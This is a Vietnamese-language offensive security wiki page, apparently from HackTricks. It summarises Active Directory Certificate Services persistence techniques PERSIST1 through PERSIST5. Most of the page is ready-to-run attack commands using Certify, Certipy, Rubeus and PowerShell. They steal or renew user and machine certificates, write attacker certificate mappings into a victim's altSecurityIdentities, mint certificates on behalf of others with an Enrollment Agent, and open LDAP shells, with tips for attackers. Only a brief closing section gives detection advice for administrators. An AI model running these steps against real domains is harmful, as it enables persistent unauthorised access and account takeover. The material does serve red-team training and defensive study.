# Duy trì quyền truy cập tài khoản AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Đây là bản tóm tắt ngắn về các chương duy trì quyền truy cập tài khoản trong nghiên cứu tuyệt vời từ [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Tìm hiểu về đánh cắp thông tin xác thực của người dùng đang hoạt động bằng chứng chỉ – PERSIST1

Trong tình huống người dùng có thể yêu cầu chứng chỉ cho phép xác thực miền, kẻ tấn công có cơ hội yêu cầu và đánh cắp chứng chỉ này để duy trì quyền truy cập trong mạng. Theo mặc định, template `User` trong Active Directory cho phép yêu cầu như vậy, mặc dù đôi khi tính năng này có thể bị vô hiệu hóa.<sup>[[3]](#references)[[7]](#references)</sup>

Bạn có thể dùng [Certify](https://github.com/GhostPack/Certify) hoặc [Certipy](https://github.com/ly4k/Certipy) để tìm các template đang bật cho phép xác thực client, sau đó yêu cầu một template:

```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```

Sức mạnh của chứng chỉ nằm ở khả năng xác thực với tư cách người dùng sở hữu nó, bất kể mật khẩu có thay đổi hay không, miễn là chứng chỉ còn hiệu lực.

Bạn có thể chuyển đổi PEM sang PFX và dùng nó để lấy TGT:

```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```

> Lưu ý: Khi kết hợp với các kỹ thuật khác (xem các mục THEFT), xác thực dựa trên chứng chỉ cho phép duy trì quyền truy cập mà không cần chạm đến LSASS, kể cả trong các ngữ cảnh không có quyền nâng cao.

## Duy trì quyền truy cập trên máy bằng chứng chỉ - PERSIST2

Nếu kẻ tấn công có quyền nâng cao trên một máy chủ, họ có thể đăng ký tài khoản máy của hệ thống bị xâm nhập để lấy chứng chỉ bằng template mặc định `Machine`. Xác thực với tư cách máy cho phép sử dụng S4U2Self cho các dịch vụ cục bộ và có thể giúp duy trì quyền truy cập lâu dài vào máy chủ:<sup>[[3]](#references)[[7]](#references)</sup>

```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```

## Mở rộng khả năng duy trì quyền truy cập thông qua gia hạn chứng chỉ - PERSIST3

Lạm dụng thời hạn hiệu lực và gia hạn của các mẫu chứng chỉ cho phép kẻ tấn công duy trì quyền truy cập lâu dài. Nếu có chứng chỉ đã được cấp trước đó cùng khóa riêng tư của nó, bạn có thể gia hạn chứng chỉ trước khi hết hạn để nhận thông tin xác thực mới có thời hạn dài mà không để lại thêm dấu vết yêu cầu gắn với principal ban đầu.<sup>[[3]](#references)[[7]](#references)</sup>

```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
            -template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```

> Mẹo vận hành: Theo dõi thời hạn của các tệp PFX do attacker nắm giữ và gia hạn sớm. Việc gia hạn cũng có thể khiến các certificate được cập nhật bao gồm extension ánh xạ SID hiện đại, giúp chúng tiếp tục sử dụng được theo các quy tắc ánh xạ DC nghiêm ngặt hơn (xem phần tiếp theo).

## Cài đặt ánh xạ certificate tường minh (altSecurityIdentities) – PERSIST4

Nếu bạn có thể ghi vào thuộc tính `altSecurityIdentities` của tài khoản mục tiêu, bạn có thể ánh xạ tường minh một certificate do attacker kiểm soát tới tài khoản đó. Cách này vẫn tồn tại sau khi đổi password và, khi sử dụng các định dạng ánh xạ mạnh, vẫn hoạt động theo cơ chế thực thi hiện đại của DC.<sup>[[2]](#references)</sup>

Quy trình tổng quát:

1. Lấy hoặc cấp một certificate xác thực client do bạn kiểm soát (ví dụ: đăng ký template `User` bằng tài khoản của bạn).
2. Trích xuất một mã định danh mạnh từ certificate (Issuer+Serial, SKI hoặc SHA1-PublicKey).
3. Thêm ánh xạ tường minh vào `altSecurityIdentities` của principal nạn nhân bằng mã định danh đó.
4. Xác thực bằng certificate của bạn; DC ánh xạ certificate tới nạn nhân thông qua ánh xạ tường minh.

Ví dụ (PowerShell) sử dụng ánh xạ Issuer+Serial mạnh:

```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Sau đó xác thực bằng PFX của bạn. Certipy sẽ lấy TGT trực tiếp:

```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```

### Xây dựng mapping `altSecurityIdentities` mạnh

Trên thực tế, mapping **Issuer+Serial** và **SKI** là những định dạng mạnh dễ tạo nhất từ chứng chỉ do kẻ tấn công nắm giữ. Điều này quan trọng sau **February 11, 2025**, khi DC mặc định sử dụng **Full Enforcement** và các mapping yếu không còn đáng tin cậy.<sup>[[1]](#references)</sup>

```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```

Ghi chú
- Chỉ sử dụng các kiểu mapping mạnh: `X509IssuerSerialNumber`, `X509SKI` hoặc `X509SHA1PublicKey`. Các định dạng yếu (Subject/Issuer, chỉ Subject, email RFC822) đã lỗi thời và có thể bị chặn bởi chính sách DC.
- Mapping áp dụng cho cả đối tượng **user** và **computer**, vì vậy chỉ cần quyền ghi vào `altSecurityIdentities` của tài khoản máy tính là đủ để duy trì quyền truy cập dưới danh nghĩa máy đó.
- Chuỗi chứng chỉ phải dẫn đến một root được DC tin cậy. Các CA doanh nghiệp trong NTAuth thường được tin cậy; một số môi trường cũng tin cậy các CA công khai.
- Xác thực Schannel vẫn hữu ích để duy trì quyền truy cập ngay cả khi PKINIT thất bại do DC thiếu EKU Smart Card Logon hoặc trả về `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Các mapping tường minh `Issuer/SID` từ năm 2025 trở đi

Trên các domain controller **Windows Server 2022+** đã cài bản cập nhật bảo mật ngày **9 tháng 9 năm 2025**, Microsoft đã bổ sung một định dạng mapping tường minh mạnh khác. Định dạng này hấp dẫn để duy trì quyền truy cập vì vẫn hoạt động sau khi chứng chỉ được cấp lại từ cùng CA:<sup>[[6]](#references)</sup>

```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Về mặt vận hành, cách này khác với các định dạng mạnh hơn trước đây:
- `Issuer+Serial` ghim **một chứng chỉ cụ thể**.
- `SKI` / `SHA1-PUKEY` ghim **một cặp khóa**.
- `Issuer/SID` ghim **CA cấp chứng chỉ + SID mục tiêu**, vì vậy các chứng chỉ được gia hạn hoặc cấp lại từ cùng CA vẫn hoạt động mà không cần viết lại `altSecurityIdentities`.

Yêu cầu và lưu ý
- Chứng chỉ được cung cấp khi đăng nhập phải thực sự chứa SID của tài khoản mục tiêu trong phần mở rộng bảo mật SID.
- Định dạng này không hữu ích với các chứng chỉ kiểu `ESC9` / `ESC16` không có phần mở rộng SID; trong những trường hợp đó, hãy dùng `Issuer+Serial`, `SKI` hoặc `SHA1-PUKEY`.

Để biết thêm về các ánh xạ tường minh yếu và các đường tấn công, xem:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent làm cơ chế duy trì quyền truy cập – PERSIST5

Nếu có được chứng chỉ Certificate Request Agent/Enrollment Agent hợp lệ, bạn có thể tùy ý tạo chứng chỉ mới hỗ trợ đăng nhập thay mặt người dùng và giữ PFX của agent ngoại tuyến làm token duy trì quyền truy cập. Quy trình lạm dụng:<sup>[[7]](#references)</sup>

```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
                   /onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
           -template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```

Cần thu hồi chứng chỉ agent hoặc quyền trên template để loại bỏ persistence này.

Ghi chú vận hành
- Các phiên bản `Certipy` hiện đại hỗ trợ cả `-on-behalf-of` và `-renew`, vì vậy kẻ tấn công nắm giữ PFX của Enrollment Agent có thể tạo và sau đó gia hạn chứng chỉ leaf mà không cần tương tác lại với tài khoản mục tiêu ban đầu.<sup>[[4]](#references)</sup>
- Nếu không thể lấy TGT dựa trên PKINIT, chứng chỉ on-behalf-of tạo ra vẫn có thể dùng để xác thực Schannel bằng `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Sử dụng chứng chỉ persistence khi PKINIT thất bại

Nếu DC không có chứng chỉ hỗ trợ Smart Card Logon, việc đăng nhập bằng chứng chỉ qua PKINIT có thể thất bại với `KDC_ERR_PADATA_TYPE_NOSUPP`. Điều đó **không** vô hiệu hóa primitive persistence: cùng PFX đó thường vẫn có thể dùng để truy cập LDAP đã xác thực bằng Schannel.<sup>[[5]](#references)</sup>

```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```

Điều này đặc biệt hữu ích sau PERSIST4/PERSIST5 vì bạn có thể tiếp tục hoạt động từ Linux/macOS và kết hợp với các hành động duy trì quyền truy cập khác trong directory, chẳng hạn như cài [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) hoặc chỉnh sửa các thuộc tính delegation có thể ghi.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 đã giới thiệu Strong Certificate Mapping Enforcement trên các domain controller. Kể từ **ngày 11 tháng 2, 2025**, DC mặc định sử dụng **Full Enforcement** đối với các ánh xạ yếu/mơ hồ; và kể từ bản cập nhật bảo mật **ngày 9 tháng 9, 2025**, các DC đã được vá không còn hỗ trợ cơ chế dự phòng Compatibility mode cũ.<sup>[[1]](#references)</sup> Những hệ quả thực tế:

- Chứng chỉ được cấp trước năm 2022 không có phần mở rộng ánh xạ SID có thể không ánh xạ ngầm được khi DC sử dụng Full Enforcement. Kẻ tấn công có thể duy trì quyền truy cập bằng cách gia hạn chứng chỉ thông qua AD CS (để có phần mở rộng SID) hoặc cài một ánh xạ tường minh mạnh vào `altSecurityIdentities` (PERSIST4).
- Các ánh xạ tường minh dùng định dạng mạnh (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` và `Issuer/SID` trên DC hiện đại) vẫn hoạt động. Các định dạng yếu (Issuer/Subject, Subject-only, RFC822) có thể bị chặn và nên tránh dùng để duy trì quyền truy cập.
- Nếu các ánh xạ yếu vẫn có vẻ hoạt động, hãy cho rằng bạn đang gặp DC chưa được vá hoặc được cấu hình khác, chứ không phải một phương thức duy trì quyền truy cập đáng tin cậy lâu dài.
- Các phương thức cấp chứng chỉ kiểu `ESC9` / `ESC16` vô hiệu hóa phần mở rộng SID khiến `Issuer/SID` không thể sử dụng; do đó, các ánh xạ mạnh dự phòng hoặc gia hạn qua template thông thường là lựa chọn thực tế để duy trì quyền truy cập.

Quản trị viên nên giám sát và cảnh báo về:
- Các thay đổi đối với `altSecurityIdentities` và việc cấp/gia hạn chứng chỉ Enrollment Agent và User.
- Nhật ký cấp chứng chỉ của CA đối với các yêu cầu thay mặt người khác và các kiểu gia hạn bất thường.

## References

- [1] [Microsoft Support – KB5014754: Những thay đổi về xác thực dựa trên chứng chỉ trên bộ điều khiển miền Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – Kỹ thuật lạm dụng ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Các kỹ thuật duy trì quyền truy cập tài khoản](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Tham chiếu lệnh](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Xác thực bằng chứng chỉ khi PKINIT không được hỗ trợ](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Giới thiệu Issuer/SID AltSecID mới](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Lạm dụng Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
